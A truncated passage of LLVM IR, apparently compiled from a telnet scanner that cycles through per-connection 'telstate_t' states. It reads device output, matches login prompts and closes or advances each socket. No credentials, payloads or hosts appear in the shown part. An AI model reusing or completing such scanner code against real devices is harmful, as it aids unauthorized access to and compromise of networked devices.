  %1061 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1062 = load i32, i32* %2, align 4
  %1063 = sext i32 %1062 to i64
  %1064 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1063
  %1065 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1064, i32 0, i32 6
  store i32 %1061, i32* %1065, align 4
  br label %1066

; <label>:1066:                                   ; preds = %1060, %1053
  %1067 = load i32, i32* %2, align 4
  %1068 = sext i32 %1067 to i64
  %1069 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1068
  %1070 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1069, i32 0, i32 0
  %1071 = load i32, i32* %1070, align 16
  %1072 = load i32, i32* %2, align 4
  %1073 = sext i32 %1072 to i64
  %1074 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1073
  %1075 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1074, i32 0, i32 8
  %1076 = load i8*, i8** %1075, align 8
  %1077 = load i32, i32* %2, align 4
  %1078 = sext i32 %1077 to i64
  %1079 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1078
  %1080 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1079, i32 0, i32 7
  %1081 = load i16, i16* %1080, align 16
  %1082 = zext i16 %1081 to i32
  %1083 = call i32 @readUntil(i32 %1071, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1076, i32 1024, i32 %1082)
  %1084 = icmp ne i32 %1083, 0
  br i1 %1084, label %1085, label %1160

; <label>:1085:                                   ; preds = %1066
  %1086 = load i32, i32* %2, align 4
  %1087 = sext i32 %1086 to i64
  %1088 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1087
  %1089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1088, i32 0, i32 6
  store i32 0, i32* %1089, align 4
  %1090 = load i32, i32* %2, align 4
  %1091 = sext i32 %1090 to i64
  %1092 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1091
  %1093 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1092, i32 0, i32 7
  store i16 0, i16* %1093, align 16
  %1094 = load i32, i32* %2, align 4
  %1095 = sext i32 %1094 to i64
  %1096 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1095
  %1097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1096, i32 0, i32 8
  %1098 = load i8*, i8** %1097, align 8
  %1099 = call i8* @strstr(i8* %1098, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #10
  %1100 = icmp ne i8* %1099, null
  br i1 %1100, label %1101, label %1121

; <label>:1101:                                   ; preds = %1085
  %1102 = load i32, i32* %2, align 4
  %1103 = sext i32 %1102 to i64
  %1104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1103
  %1105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1104, i32 0, i32 8
  %1106 = load i8*, i8** %1105, align 8
  call void @llvm.memset.p0i8.i64(i8* %1106, i8 0, i64 1024, i32 1, i1 false)
  %1107 = load i32, i32* %2, align 4
  %1108 = sext i32 %1107 to i64
  %1109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1108
  %1110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1109, i32 0, i32 0
  %1111 = load i32, i32* %1110, align 16
  %1112 = call i32 @sclose(i32 %1111)
  %1113 = load i32, i32* %2, align 4
  %1114 = sext i32 %1113 to i64
  %1115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1114
  %1116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1115, i32 0, i32 2
  store i8 0, i8* %1116, align 8
  %1117 = load i32, i32* %2, align 4
  %1118 = sext i32 %1117 to i64
  %1119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1118
  %1120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1119, i32 0, i32 3
  store i8 0, i8* %1120, align 1
  br label %1992

; <label>:1121:                                   ; preds = %1085
  %1122 = load i32, i32* %2, align 4
  %1123 = sext i32 %1122 to i64
  %1124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1123
  %1125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1124, i32 0, i32 8
  %1126 = load i8*, i8** %1125, align 8
  %1127 = call i32 @matchPrompt(i8* %1126)
  %1128 = icmp ne i32 %1127, 0
  br i1 %1128, label %1149, label %1129

; <label>:1129:                                   ; preds = %1121
  %1130 = load i32, i32* %2, align 4
  %1131 = sext i32 %1130 to i64
  %1132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1131
  %1133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1132, i32 0, i32 8
  %1134 = load i8*, i8** %1133, align 8
  call void @llvm.memset.p0i8.i64(i8* %1134, i8 0, i64 1024, i32 1, i1 false)
  %1135 = load i32, i32* %2, align 4
  %1136 = sext i32 %1135 to i64
  %1137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1136
  %1138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1137, i32 0, i32 0
  %1139 = load i32, i32* %1138, align 16
  %1140 = call i32 @sclose(i32 %1139)
  %1141 = load i32, i32* %2, align 4
  %1142 = sext i32 %1141 to i64
  %1143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1142
  %1144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1143, i32 0, i32 2
  store i8 0, i8* %1144, align 8
  %1145 = load i32, i32* %2, align 4
  %1146 = sext i32 %1145 to i64
  %1147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1146
  %1148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1147, i32 0, i32 3
  store i8 1, i8* %1148, align 1
  br label %1992

; <label>:1149:                                   ; preds = %1121
  %1150 = load i32, i32* %2, align 4
  %1151 = sext i32 %1150 to i64
  %1152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1151
  %1153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1152, i32 0, i32 2
  store i8 7, i8* %1153, align 8
  br label %1154

; <label>:1154:                                   ; preds = %1149
  %1155 = load i32, i32* %2, align 4
  %1156 = sext i32 %1155 to i64
  %1157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1156
  %1158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1157, i32 0, i32 8
  %1159 = load i8*, i8** %1158, align 8
  call void @llvm.memset.p0i8.i64(i8* %1159, i8 0, i64 1024, i32 1, i1 false)
  br label %1992

; <label>:1160:                                   ; preds = %1066
  %1161 = load i32, i32* %2, align 4
  %1162 = sext i32 %1161 to i64
  %1163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1162
  %1164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1163, i32 0, i32 0
  %1165 = load i32, i32* %1164, align 16
  %1166 = load i32, i32* %2, align 4
  %1167 = sext i32 %1166 to i64
  %1168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1167
  %1169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1168, i32 0, i32 8
  %1170 = load i8*, i8** %1169, align 8
  %1171 = load i32, i32* %2, align 4
  %1172 = sext i32 %1171 to i64
  %1173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1172
  %1174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1173, i32 0, i32 7
  %1175 = load i16, i16* %1174, align 16
  %1176 = zext i16 %1175 to i32
  %1177 = call i32 @readUntil(i32 %1165, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1170, i32 1024, i32 %1176)
  %1178 = icmp ne i32 %1177, 0
  br i1 %1178, label %1179, label %1254

; <label>:1179:                                   ; preds = %1160
  %1180 = load i32, i32* %2, align 4
  %1181 = sext i32 %1180 to i64
  %1182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1181
  %1183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1182, i32 0, i32 6
  store i32 0, i32* %1183, align 4
  %1184 = load i32, i32* %2, align 4
  %1185 = sext i32 %1184 to i64
  %1186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1185
  %1187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1186, i32 0, i32 7
  store i16 0, i16* %1187, align 16
  %1188 = load i32, i32* %2, align 4
  %1189 = sext i32 %1188 to i64
  %1190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1189
  %1191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1190, i32 0, i32 8
  %1192 = load i8*, i8** %1191, align 8
  %1193 = call i8* @strstr(i8* %1192, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0)) #10
  %1194 = icmp ne i8* %1193, null
  br i1 %1194, label %1195, label %1215

; <label>:1195:                                   ; preds = %1179
  %1196 = load i32, i32* %2, align 4
  %1197 = sext i32 %1196 to i64
  %1198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1197
  %1199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1198, i32 0, i32 8
  %1200 = load i8*, i8** %1199, align 8
  call void @llvm.memset.p0i8.i64(i8* %1200, i8 0, i64 1024, i32 1, i1 false)
  %1201 = load i32, i32* %2, align 4
  %1202 = sext i32 %1201 to i64
  %1203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1202
  %1204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1203, i32 0, i32 0
  %1205 = load i32, i32* %1204, align 16
  %1206 = call i32 @sclose(i32 %1205)
  %1207 = load i32, i32* %2, align 4
  %1208 = sext i32 %1207 to i64
  %1209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1208
  %1210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1209, i32 0, i32 2
  store i8 0, i8* %1210, align 8
  %1211 = load i32, i32* %2, align 4
  %1212 = sext i32 %1211 to i64
  %1213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1212
  %1214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1213, i32 0, i32 3
  store i8 0, i8* %1214, align 1
  br label %1992

; <label>:1215:                                   ; preds = %1179
  %1216 = load i32, i32* %2, align 4
  %1217 = sext i32 %1216 to i64
  %1218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1217
  %1219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1218, i32 0, i32 8
  %1220 = load i8*, i8** %1219, align 8
  %1221 = call i32 @matchPrompt(i8* %1220)
  %1222 = icmp ne i32 %1221, 0
  br i1 %1222, label %1243, label %1223

; <label>:1223:                                   ; preds = %1215
  %1224 = load i32, i32* %2, align 4
  %1225 = sext i32 %1224 to i64
  %1226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1225
  %1227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1226, i32 0, i32 8
  %1228 = load i8*, i8** %1227, align 8
  call void @llvm.memset.p0i8.i64(i8* %1228, i8 0, i64 1024, i32 1, i1 false)
  %1229 = load i32, i32* %2, align 4
  %1230 = sext i32 %1229 to i64
  %1231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1230
  %1232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1231, i32 0, i32 0
  %1233 = load i32, i32* %1232, align 16
  %1234 = call i32 @sclose(i32 %1233)
  %1235 = load i32, i32* %2, align 4
  %1236 = sext i32 %1235 to i64
  %1237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1236
  %1238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1237, i32 0, i32 2
  store i8 0, i8* %1238, align 8
  %1239 = load i32, i32* %2, align 4
  %1240 = sext i32 %1239 to i64
  %1241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1240
  %1242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1241, i32 0, i32 3
  store i8 1, i8* %1242, align 1
  br label %1992

; <label>:1243:                                   ; preds = %1215
  %1244 = load i32, i32* %2, align 4
  %1245 = sext i32 %1244 to i64
  %1246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1245
  %1247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1246, i32 0, i32 2
  store i8 7, i8* %1247, align 8
  br label %1248

; <label>:1248:                                   ; preds = %1243
  %1249 = load i32, i32* %2, align 4
  %1250 = sext i32 %1249 to i64
  %1251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1250
  %1252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1251, i32 0, i32 8
  %1253 = load i8*, i8** %1252, align 8
  call void @llvm.memset.p0i8.i64(i8* %1253, i8 0, i64 1024, i32 1, i1 false)
  br label %1992

; <label>:1254:                                   ; preds = %1160
  %1255 = load i32, i32* %2, align 4
  %1256 = sext i32 %1255 to i64
  %1257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1256
  %1258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1257, i32 0, i32 0
  %1259 = load i32, i32* %1258, align 16
  %1260 = load i32, i32* %2, align 4
  %1261 = sext i32 %1260 to i64
  %1262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1261
  %1263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1262, i32 0, i32 8
  %1264 = load i8*, i8** %1263, align 8
  %1265 = load i32, i32* %2, align 4
  %1266 = sext i32 %1265 to i64
  %1267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1266
  %1268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1267, i32 0, i32 7
  %1269 = load i16, i16* %1268, align 16
  %1270 = zext i16 %1269 to i32
  %1271 = call i32 @readUntil(i32 %1259, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1264, i32 1024, i32 %1270)
  %1272 = icmp ne i32 %1271, 0
  br i1 %1272, label %1273, label %1348

; <label>:1273:                                   ; preds = %1254
  %1274 = load i32, i32* %2, align 4
  %1275 = sext i32 %1274 to i64
  %1276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1275
  %1277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1276, i32 0, i32 6
  store i32 0, i32* %1277, align 4
  %1278 = load i32, i32* %2, align 4
  %1279 = sext i32 %1278 to i64
  %1280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1279
  %1281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1280, i32 0, i32 7
  store i16 0, i16* %1281, align 16
  %1282 = load i32, i32* %2, align 4
  %1283 = sext i32 %1282 to i64
  %1284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1283
  %1285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1284, i32 0, i32 8
  %1286 = load i8*, i8** %1285, align 8
  %1287 = call i8* @strstr(i8* %1286, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0)) #10
  %1288 = icmp ne i8* %1287, null
  br i1 %1288, label %1289, label %1309

; <label>:1289:                                   ; preds = %1273
  %1290 = load i32, i32* %2, align 4
  %1291 = sext i32 %1290 to i64
  %1292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1291
  %1293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1292, i32 0, i32 8
  %1294 = load i8*, i8** %1293, align 8
  call void @llvm.memset.p0i8.i64(i8* %1294, i8 0, i64 1024, i32 1, i1 false)
  %1295 = load i32, i32* %2, align 4
  %1296 = sext i32 %1295 to i64
  %1297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1296
  %1298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1297, i32 0, i32 0
  %1299 = load i32, i32* %1298, align 16
  %1300 = call i32 @sclose(i32 %1299)
  %1301 = load i32, i32* %2, align 4
  %1302 = sext i32 %1301 to i64
  %1303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1302
  %1304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1303, i32 0, i32 2
  store i8 0, i8* %1304, align 8
  %1305 = load i32, i32* %2, align 4
  %1306 = sext i32 %1305 to i64
  %1307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1306
  %1308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1307, i32 0, i32 3
  store i8 0, i8* %1308, align 1
  br label %1992

; <label>:1309:                                   ; preds = %1273
  %1310 = load i32, i32* %2, align 4
  %1311 = sext i32 %1310 to i64
  %1312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1311
  %1313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1312, i32 0, i32 8
  %1314 = load i8*, i8** %1313, align 8
  %1315 = call i32 @matchPrompt(i8* %1314)
  %1316 = icmp ne i32 %1315, 0
  br i1 %1316, label %1337, label %1317

; <label>:1317:                                   ; preds = %1309
  %1318 = load i32, i32* %2, align 4
  %1319 = sext i32 %1318 to i64
  %1320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1319
  %1321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1320, i32 0, i32 8
  %1322 = load i8*, i8** %1321, align 8
  call void @llvm.memset.p0i8.i64(i8* %1322, i8 0, i64 1024, i32 1, i1 false)
  %1323 = load i32, i32* %2, align 4
  %1324 = sext i32 %1323 to i64
  %1325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1324
  %1326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1325, i32 0, i32 0
  %1327 = load i32, i32* %1326, align 16
  %1328 = call i32 @sclose(i32 %1327)
  %1329 = load i32, i32* %2, align 4
  %1330 = sext i32 %1329 to i64
  %1331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1330
  %1332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1331, i32 0, i32 2
  store i8 0, i8* %1332, align 8
  %1333 = load i32, i32* %2, align 4
  %1334 = sext i32 %1333 to i64
  %1335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1334
  %1336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1335, i32 0, i32 3
  store i8 1, i8* %1336, align 1
  br label %1992

; <label>:1337:                                   ; preds = %1309
  %1338 = load i32, i32* %2, align 4
  %1339 = sext i32 %1338 to i64
  %1340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1339
  %1341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1340, i32 0, i32 2
  store i8 7, i8* %1341, align 8
  br label %1342

; <label>:1342:                                   ; preds = %1337
  %1343 = load i32, i32* %2, align 4
  %1344 = sext i32 %1343 to i64
  %1345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1344
  %1346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1345, i32 0, i32 8
  %1347 = load i8*, i8** %1346, align 8
  call void @llvm.memset.p0i8.i64(i8* %1347, i8 0, i64 1024, i32 1, i1 false)
  br label %1992

; <label>:1348:                                   ; preds = %1254
  %1349 = load i32, i32* %2, align 4
  %1350 = sext i32 %1349 to i64
  %1351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1350
  %1352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1351, i32 0, i32 0
  %1353 = load i32, i32* %1352, align 16
  %1354 = load i32, i32* %2, align 4
  %1355 = sext i32 %1354 to i64
  %1356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1355
  %1357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1356, i32 0, i32 8
  %1358 = load i8*, i8** %1357, align 8
  %1359 = load i32, i32* %2, align 4
  %1360 = sext i32 %1359 to i64
  %1361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1360
  %1362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1361, i32 0, i32 7
  %1363 = load i16, i16* %1362, align 16
  %1364 = zext i16 %1363 to i32
  %1365 = call i32 @readUntil(i32 %1353, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1358, i32 1024, i32 %1364)
  %1366 = icmp ne i32 %1365, 0
  br i1 %1366, label %1367, label %1442

; <label>:1367:                                   ; preds = %1348
  %1368 = load i32, i32* %2, align 4
  %1369 = sext i32 %1368 to i64
  %1370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1369
  %1371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1370, i32 0, i32 6
  store i32 0, i32* %1371, align 4
  %1372 = load i32, i32* %2, align 4
  %1373 = sext i32 %1372 to i64
  %1374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1373
  %1375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1374, i32 0, i32 7
  store i16 0, i16* %1375, align 16
  %1376 = load i32, i32* %2, align 4
  %1377 = sext i32 %1376 to i64
  %1378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1377
  %1379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1378, i32 0, i32 8
  %1380 = load i8*, i8** %1379, align 8
  %1381 = call i8* @strstr(i8* %1380, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %1382 = icmp ne i8* %1381, null
  br i1 %1382, label %1383, label %1403

; <label>:1383:                                   ; preds = %1367
  %1384 = load i32, i32* %2, align 4
  %1385 = sext i32 %1384 to i64
  %1386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1385
  %1387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1386, i32 0, i32 8
  %1388 = load i8*, i8** %1387, align 8
  call void @llvm.memset.p0i8.i64(i8* %1388, i8 0, i64 1024, i32 1, i1 false)
  %1389 = load i32, i32* %2, align 4
  %1390 = sext i32 %1389 to i64
  %1391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1390
  %1392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1391, i32 0, i32 0
  %1393 = load i32, i32* %1392, align 16
  %1394 = call i32 @sclose(i32 %1393)
  %1395 = load i32, i32* %2, align 4
  %1396 = sext i32 %1395 to i64
  %1397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1396
  %1398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1397, i32 0, i32 2
  store i8 0, i8* %1398, align 8
  %1399 = load i32, i32* %2, align 4
  %1400 = sext i32 %1399 to i64
  %1401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1400
  %1402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1401, i32 0, i32 3
  store i8 0, i8* %1402, align 1
  br label %1992

; <label>:1403:                                   ; preds = %1367
  %1404 = load i32, i32* %2, align 4
  %1405 = sext i32 %1404 to i64
  %1406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1405
  %1407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1406, i32 0, i32 8
  %1408 = load i8*, i8** %1407, align 8
  %1409 = call i32 @matchPrompt(i8* %1408)
  %1410 = icmp ne i32 %1409, 0
  br i1 %1410, label %1431, label %1411

; <label>:1411:                                   ; preds = %1403
  %1412 = load i32, i32* %2, align 4
  %1413 = sext i32 %1412 to i64
  %1414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1413
  %1415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1414, i32 0, i32 8
  %1416 = load i8*, i8** %1415, align 8
  call void @llvm.memset.p0i8.i64(i8* %1416, i8 0, i64 1024, i32 1, i1 false)
  %1417 = load i32, i32* %2, align 4
  %1418 = sext i32 %1417 to i64
  %1419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1418
  %1420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1419, i32 0, i32 0
  %1421 = load i32, i32* %1420, align 16
  %1422 = call i32 @sclose(i32 %1421)
  %1423 = load i32, i32* %2, align 4
  %1424 = sext i32 %1423 to i64
  %1425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1424
  %1426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1425, i32 0, i32 2
  store i8 0, i8* %1426, align 8
  %1427 = load i32, i32* %2, align 4
  %1428 = sext i32 %1427 to i64
  %1429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1428
  %1430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1429, i32 0, i32 3
  store i8 1, i8* %1430, align 1
  br label %1992

; <label>:1431:                                   ; preds = %1403
  %1432 = load i32, i32* %2, align 4
  %1433 = sext i32 %1432 to i64
  %1434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1433
  %1435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1434, i32 0, i32 2
  store i8 7, i8* %1435, align 8
  br label %1436

; <label>:1436:                                   ; preds = %1431
  %1437 = load i32, i32* %2, align 4
  %1438 = sext i32 %1437 to i64
  %1439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1438
  %1440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1439, i32 0, i32 8
  %1441 = load i8*, i8** %1440, align 8
  call void @llvm.memset.p0i8.i64(i8* %1441, i8 0, i64 1024, i32 1, i1 false)
  br label %1992

; <label>:1442:                                   ; preds = %1348
  %1443 = load i32, i32* %2, align 4
  %1444 = sext i32 %1443 to i64
  %1445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1444
  %1446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1445, i32 0, i32 0
  %1447 = load i32, i32* %1446, align 16
  %1448 = load i32, i32* %2, align 4
  %1449 = sext i32 %1448 to i64
  %1450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1449
  %1451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1450, i32 0, i32 8
  %1452 = load i8*, i8** %1451, align 8
  %1453 = load i32, i32* %2, align 4
  %1454 = sext i32 %1453 to i64
  %1455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1454
  %1456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1455, i32 0, i32 7
  %1457 = load i16, i16* %1456, align 16
  %1458 = zext i16 %1457 to i32
  %1459 = call i32 @readUntil(i32 %1447, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1452, i32 1024, i32 %1458)
  %1460 = icmp ne i32 %1459, 0
  br i1 %1460, label %1461, label %1536

; <label>:1461:                                   ; preds = %1442
  %1462 = load i32, i32* %2, align 4
  %1463 = sext i32 %1462 to i64
  %1464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1463
  %1465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1464, i32 0, i32 6
  store i32 0, i32* %1465, align 4
  %1466 = load i32, i32* %2, align 4
  %1467 = sext i32 %1466 to i64
  %1468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1467
  %1469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1468, i32 0, i32 7
  store i16 0, i16* %1469, align 16
  %1470 = load i32, i32* %2, align 4
  %1471 = sext i32 %1470 to i64
  %1472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1471
  %1473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1472, i32 0, i32 8
  %1474 = load i8*, i8** %1473, align 8
  %1475 = call i8* @strstr(i8* %1474, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0)) #10
  %1476 = icmp ne i8* %1475, null
  br i1 %1476, label %1477, label %1497

; <label>:1477:                                   ; preds = %1461
  %1478 = load i32, i32* %2, align 4
  %1479 = sext i32 %1478 to i64
  %1480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1479
  %1481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1480, i32 0, i32 8
  %1482 = load i8*, i8** %1481, align 8
  call void @llvm.memset.p0i8.i64(i8* %1482, i8 0, i64 1024, i32 1, i1 false)
  %1483 = load i32, i32* %2, align 4
  %1484 = sext i32 %1483 to i64
  %1485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1484
